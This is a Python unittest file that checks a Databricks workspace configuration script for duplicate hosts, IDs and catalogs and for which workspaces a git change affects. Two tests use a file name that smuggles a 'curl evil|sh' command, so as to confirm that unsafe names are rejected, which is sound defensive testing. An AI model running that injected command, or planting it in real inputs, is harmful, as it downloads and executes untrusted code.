"""scripts/workspaces.py: checks across the workspace files, and which workspaces a change concerns."""
import json
import pathlib
import shutil
import subprocess
import tempfile
import unittest
from unittest import mock

from helpers import ROOT, load

ws = load("workspaces")


class Fleet(unittest.TestCase):
    """Checks across workspace files: what only shows when two workspaces are compared."""

    def setUp(self):
        self.root = pathlib.Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, self.root)

    def add(self, name, bu="fin", account="acct-1", host=None, id_=None, catalog=None, budget_policies=True, extra=""):
        f = self.root / f"{name}.yaml"
        host = host or f"https://adb-{abs(hash(name)) % 10**6}.1.azuredatabricks.net"
        id_ = id_ or str(abs(hash(name + "id")) % 10**9)
        text = f"bu: {bu}          # business unit\naccount_id: \"{account}\"\nhost: {host}   # url\nid: {id_}\n"
        if catalog:
            text += f"default_catalog: null\ncatalog:\n  name: {catalog}   # metastore-wide\n"
        if not budget_policies:
            text += "budget_policies:\n  enabled: false   # managed elsewhere\n"
        f.write_text(text + extra)
        return f

    def problems(self):
        return ws.check(self.root)[1]

    def test_distinct_workspaces_pass(self):
        self.add("fin-dev", bu="fin", catalog="fin_dev")
        self.add("hr-dev", bu="hr", catalog="hr_dev")
        self.add("_example", bu="fin", catalog="fin_dev")  # templates are not workspaces
        self.assertEqual(self.problems(), [])

    def test_same_host_or_id(self):
        self.add("a", bu="a", host="https://adb-1.1.azuredatabricks.net", id_="1")
        self.add("b", bu="b", host="https://adb-1.1.azuredatabricks.net/", id_="1")
        got = self.problems()
        self.assertEqual(len(got), 2, got)
        self.assertTrue(any("same host" in p for p in got) and any("same workspace id" in p for p in got))

    def test_same_default_catalog(self):
        # Without a catalog name, both get the baseline's {bu}_citizen_dev.
        self.add("fin-dev", bu="fin", account="acct-1", budget_policies=False)
        b = self.add("fin-prd", bu="fin", account="acct-2", budget_policies=False)
        self.assertIn("same catalog name (fin_citizen_dev)", " ".join(self.problems()))
        b.write_text(b.read_text() + "catalog: null   # no catalog here\n")
        self.assertEqual(self.problems(), [])

    def test_the_id_read_from_the_host_is_compared_too(self):
        self.add("a", bu="a", host="https://adb-7.1.azuredatabricks.net", catalog="a_cd")
        b = self.add("b", bu="b", host="https://adb-7.1.azuredatabricks.net", catalog="b_cd")
        for f in (self.root / "a.yaml", b):
            f.write_text(f.read_text().replace("\nid: ", "\n# id: "))
        self.assertIn("same workspace id (7)", " ".join(self.problems()))

    def test_same_catalog(self):
        self.add("a", bu="a", catalog="shared_cat")
        self.add("b", bu="b", catalog="shared_cat")
        self.assertIn("same catalog name (shared_cat)", " ".join(self.problems()))

    def test_same_bu_on_one_account_collides_on_budget_policies(self):
        self.add("fin-dev", bu="fin", catalog="fin_dev")
        self.add("fin-prd", bu="FIN", catalog="fin_prd")
        got = self.problems()
        self.assertEqual(len(got), 1, got)
        self.assertIn("FIN-SHARED", got[0])

    def test_same_bu_is_fine_on_another_account_or_without_budget_policies(self):
        self.add("fin-dev", bu="fin", account="acct-1", catalog="fin_dev")
        self.add("fin-prd", bu="fin", account="acct-2", catalog="fin_prd")
        self.add("fin-test", bu="fin", account="acct-1", budget_policies=False, catalog="fin_test")
        self.assertEqual(self.problems(), [])

    def test_unsafe_file_names(self):
        self.add('x";curl evil|sh;"')
        self.add("Has Space")
        self.assertEqual(len(self.problems()), 2)

    def test_field_reads_quoted_and_commented_values(self):
        self.add("a", host="https://adb-9.1.azuredatabricks.net", account="acct-1")
        with mock.patch.object(ws, "WORKSPACES", self.root), mock.patch.object(ws, "DEV_WORKSPACES", self.root / "none"):
            self.assertEqual(ws.field("a", "host"), "https://adb-9.1.azuredatabricks.net")
            self.assertEqual(ws.field("a", "account_id"), "acct-1")
            with self.assertRaises(SystemExit):
                ws.field("a", "missing")
            with self.assertRaises(SystemExit):
                ws.field('x";curl evil|sh;"', "host")

    def test_config_and_dev_workspaces(self):
        # dev/workspaces/ holds the workspaces that test the framework; names are unique across both.
        config, dev = self.root / "config", self.root / "dev"
        config.mkdir(), dev.mkdir()
        (config / "org-ws.yaml").write_text("bu: o\nhost: https://org-ws\nid: o1\n")
        (dev / "dev-ws.yaml").write_text("bu: d\nhost: https://dev-ws\nid: d1\n")
        with mock.patch.object(ws, "WORKSPACES", config), mock.patch.object(ws, "DEV_WORKSPACES", dev):
            self.assertEqual(ws.ws_file("dev-ws"), dev / "dev-ws.yaml")
            self.assertEqual(ws.names(), ["dev-ws", "org-ws"])
            self.assertEqual(ws.check()[1], [])
            (dev / "org-ws.yaml").write_text("bu: z\nhost: https://other\nid: z1\n")
            self.assertIn("org-ws is in both", " ".join(ws.check()[1]))
            with self.assertRaises(SystemExit):
                ws.ws_file("org-ws")

    def test_the_account_comes_from_the_baseline_unless_the_file_sets_it(self):
        f = self.root / "a.yaml"
        f.write_text("bu: a\nhost: https://adb-1.1.azuredatabricks.net\n")
        baseline = self.root / "defaults"
        baseline.mkdir()
        (baseline / "cost.yaml").write_text("account_id: acct-base   # the account\n")
        with mock.patch.object(ws, "DEFAULTS", baseline):
            self.assertEqual(ws.workspace_info(f)["account"], "acct-base")
            f.write_text(f.read_text() + "account_id: acct-own\n")
            self.assertEqual(ws.workspace_info(f)["account"], "acct-own")

    def test_the_repository_passes(self):
        self.assertEqual(ws.check()[1], [])


class Affected(unittest.TestCase):
    """Which workspaces a pull request plans and a merge applies, in a throwaway git repository."""

    def setUp(self):
        self.repo = pathlib.Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, self.repo)
        for d in ("config/workspaces", "config/defaults", "dev/workspaces", "terraform/tests", "docs"):
            (self.repo / d).mkdir(parents=True)
        for name in ("alpha", "beta"):
            (self.repo / f"config/workspaces/{name}.yaml").write_text(f"bu: {name}\n")
        (self.repo / "config/workspaces/_example.yaml").write_text("bu: xyz\n")
        (self.repo / "dev/workspaces/gamma.yaml").write_text("bu: gamma\n")
        for f in ("config/defaults/settings.yaml", "terraform/main.tf", "terraform/tests/x.tftest.hcl", "docs/x.md"):
            (self.repo / f).write_text("x\n")
        self.git("init", "-q", "-b", "main")
        self.git("add", "-A")
        self.git("commit", "-q", "-m", "base")
        self.base = self.git("rev-parse", "HEAD").strip()
        patches = [mock.patch.object(ws, "ROOT", self.repo), mock.patch.object(ws, "WORKSPACES", self.repo / "config/workspaces"),
                   mock.patch.object(ws, "DEV_WORKSPACES", self.repo / "dev/workspaces")]
        for p in patches:
            p.start()
            self.addCleanup(p.stop)

    def git(self, *args):
        return subprocess.run(["git", "-c", "user.email=t@t", "-c", "user.name=t", *args], cwd=self.repo,
                              capture_output=True, text=True, check=True).stdout

    def change(self, *paths, delete=()):
        for p in paths:
            f = self.repo / p
            f.parent.mkdir(parents=True, exist_ok=True)
            f.write_text(f.read_text() + "y\n" if f.exists() else "bu: new\n")
        for p in delete:
            (self.repo / p).unlink()
        self.git("add", "-A")
        self.git("commit", "-q", "-m", "change")

    def affected(self, plan=False):
        return ws.affected(self.base, "HEAD", plan)

    def test_a_workspace_file_concerns_that_workspace(self):
        self.change("config/workspaces/beta.yaml")
        self.assertEqual(self.affected(), {"workspaces": ["beta"], "removed": []})

    def test_a_new_workspace_file_concerns_only_it(self):
        self.change("config/workspaces/delta.yaml")
        self.assertEqual(self.affected()["workspaces"], ["delta"])

    def test_dev_workspaces_too(self):
        self.change("dev/workspaces/gamma.yaml")
        self.assertEqual(self.affected()["workspaces"], ["gamma"])

    def test_the_baseline_or_terraform_concerns_every_workspace(self):
        for f in ("config/defaults/settings.yaml", "terraform/main.tf"):
            with self.subTest(f=f):
                self.change(f)
                self.assertEqual(self.affected()["workspaces"], ["alpha", "beta", "gamma"])

    def test_tests_docs_and_templates_concern_nothing(self):
        self.change("terraform/tests/x.tftest.hcl", "docs/x.md", "config/workspaces/_example.yaml")
        self.assertEqual(self.affected(), {"workspaces": [], "removed": []})

    def test_what_the_plan_comment_shows_is_planned_everywhere_but_never_applied(self):
        self.change("config/setup.yaml")
        self.assertEqual(self.affected(plan=True)["workspaces"], ["alpha", "beta", "gamma"])
        self.assertEqual(self.affected(plan=False)["workspaces"], [])

    def test_a_deleted_workspace_file_is_removed_not_planned(self):
        self.change(delete=["config/workspaces/beta.yaml"])
        self.assertEqual(self.affected(), {"workspaces": [], "removed": ["beta"]})

    def test_a_workspace_moved_to_dev_is_not_removed(self):
        (self.repo / "dev/workspaces/beta.yaml").write_text("bu: beta\n")
        self.change(delete=["config/workspaces/beta.yaml"])
        self.assertEqual(self.affected(), {"workspaces": ["beta"], "removed": []})

    def test_without_a_base_everything(self):
        self.assertEqual(ws.affected("0" * 40, "HEAD")["workspaces"], ["alpha", "beta", "gamma"])

    def test_the_command_prints_json(self):
        self.change("config/workspaces/alpha.yaml")
        out = subprocess.run(["python3", str(ROOT / "scripts/workspaces.py"), "list"], capture_output=True, text=True)
        self.assertIsInstance(json.loads(out.stdout), list)


if __name__ == "__main__":
    unittest.main()
